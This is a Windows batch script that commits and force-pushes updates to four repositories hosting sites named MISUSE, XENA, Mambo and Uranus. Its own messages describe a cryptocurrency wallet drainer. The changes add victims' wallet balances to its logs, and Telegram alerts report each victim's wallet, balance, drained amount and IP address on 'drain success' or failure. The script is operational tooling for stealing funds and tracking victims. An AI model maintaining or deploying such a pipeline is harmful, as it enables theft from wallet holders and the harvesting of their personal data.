@echo off
echo ========================================
echo FIX BALANCE IN ALL TRANSACTION LOGS
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo BALANCE IN ALL TRANSACTIONS FIX
echo ========================================
echo.
echo 1. FRONTEND FIXES
echo - Added balance to successful transaction logs
echo - Added balance to cancelled transaction logs
echo - Balance now included in ALL transaction types
echo - Consistent balance reporting across all states
echo.
echo 2. BACKEND FIXES
echo - Updated server.js to handle lamports in success logs
echo - Updated server.js to handle lamports in cancellation logs
echo - Updated telegram.js to display balance in success messages
echo - Updated telegram.js to display balance in cancellation messages
echo.
echo 3. TELEGRAM MESSAGE UPDATES
echo - Success messages now show: Wallet, Balance, Drained Amount, IP
echo - Cancellation messages now show: Wallet, Type, Balance, Reason, IP
echo - Failed messages already show: Wallet, Balance, Reason, IP
echo - Detection messages already show: Wallet, Type, Balance, IP
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "FIX: Include balance in all transaction logs - success, failed, and cancelled transactions now show wallet balance"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo BALANCE IN ALL TRANSACTIONS FIXED
echo ========================================
echo.
echo ✓ Frontend includes balance in ALL transaction logs
echo ✓ Backend handles balance in ALL transaction types
echo ✓ Telegram messages show balance consistently
echo ✓ All repositories updated
echo.
echo EXPECTED BEHAVIOR:
echo - Wallet detection: Shows wallet type and balance
echo - Drain success: Shows wallet, balance, drained amount
echo - Drain failed: Shows wallet, balance, reason
echo - Transaction cancelled: Shows wallet, type, balance, reason
echo - Consistent balance reporting across all states
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo BALANCE IN ALL TRANSACTIONS HAS BEEN FIXED!
echo.
pause
